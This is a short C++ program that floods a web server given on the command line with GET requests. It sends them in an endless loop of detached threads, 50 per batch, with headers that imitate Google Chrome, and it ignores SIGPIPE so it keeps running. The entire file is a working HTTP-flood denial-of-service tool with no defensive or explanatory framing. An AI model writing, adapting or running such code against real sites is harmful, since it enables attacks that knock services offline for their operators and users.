#define CPPHTTPLIB_OPENSSL_SUPPORT

#include "httplib.h"                  // To make Requests
#include <thread>                     // To make fast requests
#include <cstdlib>                    // For std::signal
#include <string>                     // For String Declarations
#include <chrono>                     // For time

#pragma comment(lib, "libssl.so")     // Requires LibSSL to make HTTPS Requests
#pragma comment(lib, "libcrypto.so")  // Requires LibCrypto to use OpenSSL
using namespace std;

void sigpipe_remove(int sig) {
  return;
}

void request_get(string url, string route) {
  using namespace httplib;
  Client cli(url.c_str());
  Headers headers {
    {"User-Agent", "Mozilla/5.0 (X11; CrOS x86_64 15054.114.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},
    {"Upgrade-Insecure-Requests", "1"},
    {"Sec-CH-UA-Platform", "Chrome OS"},
    {"Sec-CH-UA-Mobile", "?0"},
    {"Sec-CH-UA", "Chromium\";v=\"106\", \"Google Chrome\";v=\"106\", \"Not;A=Brand\";v=\"99"},
    {"Sec-Fetch-Site", "none"},
    {"Sec-Fetch-Mode", "navigate"},
    {"Set-Fetch-User", "?1"},
    {"Sec-Fetch-Dest", "document"},
    {"Cache-Control", "max-age=0"}
  }; // Normal Headers of Google Chrome
  
  cli.set_keep_alive(true);
  cli.set_follow_location(true);
  cli.Get(route.c_str(), headers);
}

int main(int argc, char* argv[]) {
  using namespace chrono_literals;
  string url, route;
  url.assign(argv[1]);

  if(argc <= 2) {
    route.assign("/");
  } else {
    route.assign(argv[2]);
  }

  signal(SIGPIPE, &sigpipe_remove);

  while (true) {
    try {
      for(unsigned i = 0; i < 50; i++) {
        try {
          thread t(request_get, url, route);
          t.detach();
        } catch (...) {
          this_thread::sleep_for(100ms);
        }
      }
      this_thread::sleep_for(200ms);
    } catch (...) {}
  }
}